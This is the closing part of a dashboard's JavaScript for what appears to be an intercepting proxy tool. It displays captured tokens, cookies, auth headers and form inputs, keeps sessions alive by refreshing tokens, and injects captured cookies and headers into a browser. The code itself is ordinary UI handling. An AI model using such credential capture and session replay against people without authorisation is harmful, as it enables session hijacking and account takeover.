      if(msg.keepalive_status){keepaliveStatus=msg.keepalive_status;renderKeepalive()}
      if(msg.log_file_info){logFileInfo=msg.log_file_info;renderLogFileInfo()}
      if(msg.init_errors&&msg.init_errors.length){
        // Surface init-collector failures so the operator knows the
        // dashboard is up but a piece of state failed to load.
        console.warn('init payload had collector errors:', msg.init_errors);
        const banner=document.createElement('div');
        banner.style.cssText='padding:6px 12px;background:#7f1d1d;color:#fecaca;font-size:12px;font-family:monospace;border-bottom:1px solid #991b1b';
        banner.textContent='init errors: '+msg.init_errors.join(' | ');
        document.body.insertBefore(banner, document.body.firstChild);
      }
    }
    else if(msg.type==='config'){configCache=msg.config;renderConfig();renderBrowserConfig();renderLoggingConfig();renderSlackConfig();renderPresets();renderUpstreamHost();renderNoisyExts();renderLogFileInfo();renderIntegrations();renderCaptureLinkList();_paintHideSidBtn()}
    else if(msg.type==='sessions')renderSessions(msg.sessions);
    else if(msg.type==='sessions_pruned'){
      // Backend asked us to drop any remembered sessions not in `keep`.
      const keep=new Set(msg.keep||[]);
      for(const sid of Object.keys(knownSessions)){
        if(!keep.has(sid))delete knownSessions[sid];
      }
      // Fall back to "All Logs" if the active tab just got removed.
      if(currentTab!=='all' && currentTab!=='auth-proxy' && !knownSessions[currentTab]){currentTab='all'}
      flowBySession={}; flowSelectedSid=''; idxSelectedSid='';
      // Drop the pinned sid only if it's no longer a known session.
      if(pinnedSid && !keep.has(pinnedSid))pinnedSid='';
      idxFlaggedItems=new Set(); idxActiveSeqs=new Set();
      renderTabs();
      switchTab(currentTab);
    }
    else if(msg.type==='saved_sessions'){savedSessions=msg.data;if(currentTab==='saved')renderSaved()}
    else if(msg.type==='sites'){sitesCache=msg.sites;if(currentTab==='creds')renderCreds()}
    else if(msg.type==='sites_changed'){
      // Backend signal that the credentials store was just updated
      // — fetch fresh data so the Captured Data tab reflects the
      // new tokens / cookies / headers without a manual reload.
      send({cmd:'get_sites'});
    }
    else if(msg.type==='proxy_status'){proxyStatus=msg;renderProxy()}
    else if(msg.type==='proxy_test'){renderProxyTest(msg)}
    else if(msg.type==='auth_proxy_status'){authProxyStatus=msg;renderAuthProxy()}
    else if(msg.type==='keepalive_status'){keepaliveStatus=msg;renderKeepalive()}
    else if(msg.type==='keepalive_log'){appendKeepaliveLog(msg.entry)}
    else if(msg.type==='keepalive_log_history'){keepaliveLogEntries=msg.entries||[];renderKeepaliveLog()}
    else if(msg.type==='keepalive_diagnose_result'){_kaRenderDiagnostic(msg)}
    else if(msg.type==='keepalive_pw_refresh_result'){
      const el=document.getElementById('keepalive-debug-result');
      const running=document.getElementById('ka-pw-running');
      if(running)running.remove();
      if(!el)return;
      const note=document.createElement('div');
      note.style.cssText='margin-top:8px;padding:10px 14px;border-radius:4px;font-size:13px';
      if(msg.ok && msg.persisted){
        note.style.cssText+=';background:#064e3b;color:#a7f3d0;border-left:3px solid #10b981';
        note.innerHTML=`<b>✓ Playwright refresh succeeded.</b><br>
          source=<code>${esc(msg.source||'')}</code> · token len=${esc(String((msg.new_token||'').length))} · elapsed=${esc(String(msg.elapsed_ms||0))}ms<br>
          <span style="font-size:12px;color:#a7f3d0">New token persisted to credentials store. Site failure counter reset.</span>`;
      } else if(msg.ok){
        note.style.cssText+=';background:#1e1b00;color:#fef08a;border-left:3px solid #fbbf24';
        note.innerHTML=`<b>Playwright captured a token but persist failed.</b><br>
          source=<code>${esc(msg.source||'')}</code> · ${esc(msg.persist_error||'unknown error')}`;
      } else {
        note.style.cssText+=';background:#7f1d1d;color:#fecaca;border-left:3px solid #ef4444';
        note.innerHTML=`<b>✗ Playwright refresh failed.</b><br>
          source=<code>${esc(msg.source||'?')}</code> · elapsed=${esc(String(msg.elapsed_ms||0))}ms<br>
          ${esc(msg.error||'(no error message)')}
          ${msg.notes && msg.notes.length?`<details style="margin-top:6px"><summary style="cursor:pointer;color:#fecaca">${msg.notes.length} notes</summary><ul style="margin:4px 0 0 16px;font-size:11px">${msg.notes.map(n=>`<li>${esc(n)}</li>`).join('')}</ul></details>`:''}`;
      }
      el.appendChild(note);
      // After a successful refresh, re-fire the diagnose so the
      // panel updates with the fresh token.
      if(msg.ok && msg.persisted){
        setTimeout(()=>kaDiagnose(msg.site_id),500);
      }
    }
    else if(msg.type==='keepalive_resume_result'){
      if(msg.ok){
        // Re-fetch the diagnostic so the panel updates without a paused banner.
        kaDiagnose(msg.site_id);
      } else {
        alert('Resume failed: '+(msg.error||'site not found in failure state'));
      }
    }
    else if(msg.type==='log_file_info'){logFileInfo=msg;renderLogFileInfo()}
    else if(msg.type==='flow_history'){
      if(!msg.session_id)return;  // ignore empty-sid history — would add a blank list row
      flowBySession[msg.session_id]=msg.entries||[];
      if(currentTab==='flow'&&msg.session_id===flowSelectedSid)renderFlow();
      if(currentTab==='index'&&msg.session_id===idxSelectedSid)renderIndex();
      if(msg.reclassify)renderReclassifyBanner(msg.reclassify);
      // Refresh the session selector so its ⚡ / ☐ indicator picks
      // up DRS Bearers in the freshly-loaded flow. Cheap — same
      // walker used to render the dropdown options.
      if(currentTab==='flow')refreshFlowSessionList();
    }
    else if(msg.type==='flow_cleared'){
      flowBySession[msg.session_id]=[];
      if(currentTab==='flow'&&msg.session_id===flowSelectedSid)renderFlow();
      if(currentTab==='index'&&msg.session_id===idxSelectedSid)renderIndex();
    }
    else if(msg.type==='rag_submit_result'){
      const note=msg.ok?`Sent as "${msg.finding_name}" (HTTP ${msg.status||'?'})`:`Failed: ${msg.error||'unknown'}`;
      const el=document.getElementById('flow-ai');
      if(el)el.innerHTML=`<div class="flow-ai"><h3>RAG submission</h3>${esc(note)}</div>`;
      document.querySelectorAll('.flow-toolbar .btn').forEach(b=>{if(/Sending/.test(b.textContent)){b.disabled=false;b.textContent='Send to RAG'}});
    }
    else if(msg.type==='rag_cleared'){
      const note=msg.ok?`Cleared ${msg.cleared} imported finding(s). Captured flow traces still auto-surface in RAG.`:`Clear failed: ${msg.error||'unknown'}`;
      const el=document.getElementById('flow-ai');
      if(el)el.innerHTML=`<div class="flow-ai"><h3>RAG</h3>${esc(note)}</div>`;
    }
    else if(msg.type==='captured_proxy_list'){
      capturedHosts=msg.hosts||[];
      renderHydrateHostList();
    }
    else if(msg.type==='devices_list'){
      devicesCache=msg.devices||[];
      renderTabs();
      if(currentTab==='devices')renderDevicesList();
    }
    else if(msg.type==='device_registered'){
      if(msg.error){alert('Register failed: '+msg.error);return}
      send({cmd:'list_devices'});
      if(msg.probe_url){
        alert('Device registered. To complete the active probe, browse to '+msg.probe_url+' through localhost:3128.');
      }
    }
    else if(msg.type==='device_updated'){
      if(msg.error){alert('Update failed: '+msg.error);return}
      send({cmd:'list_devices'});
    }
    else if(msg.type==='device_deleted'){
      send({cmd:'list_devices'});
    }
    else if(msg.type==='device_launch'){
      if(msg.browser_url){window.open(msg.browser_url,'_blank','popup,width=1280,height=900')}
    }
    else if(msg.type==='hydrate_result'){
      const el=document.getElementById('hydrate-result');
      if(!el)return;
      if(msg.ok){
        const nav=msg.navigated_to?` → navigated to ${esc(msg.navigated_to)}`:'';
        el.innerHTML=`<span style="color:#4ade80">&#10003; Injected ${msg.cookies_added||0} cookies + ${msg.headers_added||0} headers${nav}</span>`;
      }else{
        el.innerHTML=`<span style="color:#f87171">&#10007; ${esc(msg.error||'failed')}</span>`;
      }
    }
    else if(msg.type==='diagnostics_result'){
      const el=document.getElementById('diag-results');
      const s=document.getElementById('diag-summary');
      const checks=msg.checks||[];
      if(s){
        const counts={ok:0,warn:0,fail:0};
        for(const c of checks)counts[c.status]=(counts[c.status]||0)+1;
        const when=msg.ran_at?new Date(msg.ran_at*1000).toLocaleTimeString():'';
        s.innerHTML=`<span style="color:#4ade80">${counts.ok} ok</span> · <span style="color:#fbbf24">${counts.warn} warn</span> · <span style="color:#f87171">${counts.fail} fail</span> · ${when}`;
      }
      if(el){
        if(!checks.length){el.innerHTML='<div style="color:#f87171">No results returned.</div>';return}
        el.innerHTML=checks.map(c=>{
          const det=c.detail?`<div class="diag-detail">${esc(c.detail)}</div>`:'';
          return `<div class="diag-row ${c.status}">
            <div class="diag-head">
              <span class="diag-dot ${c.status}"></span>
              <span class="diag-name">${esc(c.name)}</span>
              <span class="diag-msg">${esc(c.message||'')}</span>
            </div>${det}
          </div>`;
        }).join('');
      }
    }
    else if(msg.type==='ollama_test_result'){
      const el=document.getElementById('ollama-test-result');
      if(msg.ok){
        ollamaModels=msg.models||[];
        // Refresh datalist (it's re-rendered only on renderIntegrations;
        // update it in place for immediate effect)
        const dl=document.getElementById('ollama-models-datalist');
        if(dl)dl.innerHTML=ollamaModels.map(m=>`<option value="${esc(m)}">`).join('');
        renderOllamaModelChips();
        const found=msg.model_found;
        if(found){
          setOllamaStatus('ok',`Connected. Model ${msg.configured_model} available.`);
          if(el)el.innerHTML=`<span style="color:#4ade80">&#10003; Connected. Model <b>${esc(msg.configured_model||'')}</b> available (${ollamaModels.length} total).</span>`;
        }else{
          setOllamaStatus('warn',`Connected, but model ${msg.configured_model} not found.`);
          if(el)el.innerHTML=`<span style="color:#fbbf24">&#9888; Connected, but <b>${esc(msg.configured_model||'')}</b> not found. Pick one below.</span>`;
        }
      }else{
        ollamaModels=[];
        renderOllamaModelChips();
        setOllamaStatus('err',msg.error||'failed');
        if(el)el.innerHTML=`<span style="color:#f87171">&#10007; ${esc(msg.error||'unknown error')}</span>`;
      }
    }
    else if(msg.type==='flow_analysis_chunk'){
      // Live token delta — accumulate and repaint. Backend batches these to
      // ~100ms, so painting per message is cheap.
      const sid=msg.session_id||flowSelectedSid;
      if(sid){
        if(!_analysisStream[sid]) _analysisStream[sid]={text:'', preset:(_analysisInProgress[sid]||{}).preset||'general'};
        _analysisStream[sid].text += (msg.delta||'');
        if(_analysisInProgress[sid]) _analysisInProgress[sid].lastActivity=Date.now();  // reset watchdog
        if(currentTab==='flow' && flowSelectedSid===sid) _paintAnalysis(sid);
      }
    }
    else if(msg.type==='flow_analysis'){
      // Stash the result per session so it survives row-clicks and tab-switches.
      const sid=msg.session_id||flowSelectedSid;
      if(sid){
        _lastAnalysis[sid]={msg, at: Date.now()};
        delete _analysisInProgress[sid];      // clear in-flight state
        delete _analysisStream[sid];          // clear live buffer; final render takes over
      }
      _paintAnalysis(sid);
      renderTabs();  // drop the spinner from the Flow Trace tab button
      _toolEnd('Analyze (Ollama)', !!msg.ok,
        msg.ok ? `${msg.entry_count||0} exchanges · ${msg.preset||'general'}`
               : `error: ${msg.error||''}`);
    }
    else if(msg.type==='rag_submit_result'){
      _toolEnd('Send to RAG', !!msg.ok,
        msg.ok ? (msg.message||'submitted') : (msg.error||''));
    }
    else if(msg.type==='debug_dom'){_renderDebugDomResult(msg);_toolEnd('Dump DOM', !!msg.ok, msg.ok?`${msg.bytes||0} bytes → ${msg.path||''}`:msg.error||'')}
    else if(msg.type==='debug_frames'){_renderDebugFramesResult(msg);_toolEnd('Frames', !!msg.ok, msg.ok?`${(msg.frames||[]).length} frame(s)`:msg.error||'')}
    else if(msg.type==='debug_flow_export'){_renderDebugFlowExport(msg);_toolEnd('Export Flow', !!msg.ok, msg.ok?`${msg.entries||0} entries → ${msg.path||''}`:msg.error||'')}
    else if(msg.type==='flagged_error'){_renderFlaggedError(msg)}
  };
}

// ── WebSocket: Data (logs, captured events) ──
let wsData=null;
function connectData(){
  const proto=location.protocol==='https:'?'wss:':'ws:';
  const _ak2=new URLSearchParams(location.search).get('api_key')||'';
  wsData=new WebSocket(`${proto}//${location.host}/ws/data${_ak2?'?api_key='+_ak2:''}`);
  wsData.onopen=()=>updateBadge();
  wsData.onclose=()=>{updateBadge();setTimeout(connectData,2000)};
  wsData.onerror=()=>wsData.close();
  wsData.onmessage=e=>{
    const msg=JSON.parse(e.data);
    if(msg.type==='history'){
      for(const entry of(msg.logs||[])){
        allLogs.push(entry);noteService(entry.category);const c=cls(entry.message),sid=entry.session_id||'';
        if(sid){ensureSession(sid,{});knownSessions[sid].logs.push(entry);
          if(c==='input'){const m=entry.message.match(/CAPTURED_INPUT=(.+?)\s+\(flushed/);if(m)knownSessions[sid].captured_inputs.push(m[1])}}
        if(c==='bearer'||c==='token')stats.tok++;if(c==='cookie')stats.ck++;if(c==='auth'||c==='body-auth')stats.au++;if(c==='input')stats.inp++;
      }
      document.getElementById('st-tok').textContent=stats.tok;document.getElementById('st-ck').textContent=stats.ck;
      document.getElementById('st-au').textContent=stats.au;document.getElementById('st-inp').textContent=stats.inp;
      renderTabs();rerender();
    }
    else if(msg.type==='log')addLog(msg);
    else if(msg.type==='flow'){
      const sid=msg.session_id;
      const _isNewSid=!flowBySession[sid];
      if(_isNewSid)flowBySession[sid]=[];
      // First row for a session the dropdown doesn't know about yet (e.g. a
      // just-started dashboard-test trace) — record its metadata and refresh
      // the selector so it becomes selectable immediately.
      if(_isNewSid && !knownSessions[sid] && !flowSessionMeta[sid]){
        flowSessionMeta[sid]={sid,count:0,browser:false,tool:msg.tool||'',site_id:msg.site_id||''};
        if(currentTab==='flow')refreshFlowSessionList();
      }
      // Track whether this session previously had a DRS Bearer so
      // we only re-render the selector dropdown on transition (not
      // every subsequent row that also carries one).
      const _hadDrs=_sessionHasDrsToken(sid);
      flowBySession[sid].push(msg);
      if(flowSessionMeta[sid])flowSessionMeta[sid].count=flowBySession[sid].length;
      if(currentTab==='flow' && !_hadDrs && _drsTokenFromEntry(msg)){
        refreshFlowSessionList();
      }
      if(currentTab==='flow'&&sid===flowSelectedSid){
        const tl=document.getElementById('flow-timeline');
        if(tl){
          // Streaming append: banner this row when its phase differs
          // from the most recent prior tagged row's phase. Only walk
          // backwards as far as needed to find one.
          const phase=_primaryPhase(msg);
          let banner='';
          if(phase){
            let lastPhase=null;
            const arr=flowBySession[sid];
            for(let i=arr.length-2;i>=0;i--){
              const p=_primaryPhase(arr[i]);
              if(p){lastPhase=p;break}
            }
            if(phase!==lastPhase)banner=_phaseBannerHtml(phase);
          }
          tl.insertAdjacentHTML('beforeend',banner+flowRowHtml(msg));
          document.getElementById('flow-count').textContent=`${flowBySession[sid].length} exchanges`;
          if(flowRowMatchesTaint(msg))renderTaintChips();
        }
      }
    }
    else if(msg.type==='flow_update'){
      const arr=flowBySession[msg.session_id]||[];const e=arr.find(x=>x.req_id===msg.req_id);if(e){Object.assign(e,msg.patch);if(currentTab==='flow'&&msg.session_id===flowSelectedSid)renderFlow()}
    }
  };
}

function updateBadge(){
  const ctrl=wsCtrl&&wsCtrl.readyState===1,data=wsData&&wsData.readyState===1;
  const b=document.getElementById('ws-badge');
  if(ctrl&&data){b.textContent='ctrl+data live';b.className='badge badge-live'}
  else if(ctrl||data){b.textContent=(ctrl?'ctrl':'data')+' only';b.className='badge badge-live'}
  else{b.textContent='disconnected';b.className='badge badge-dead'}
}

connectControl();
connectData();
</script>
</body>
</html>
"""
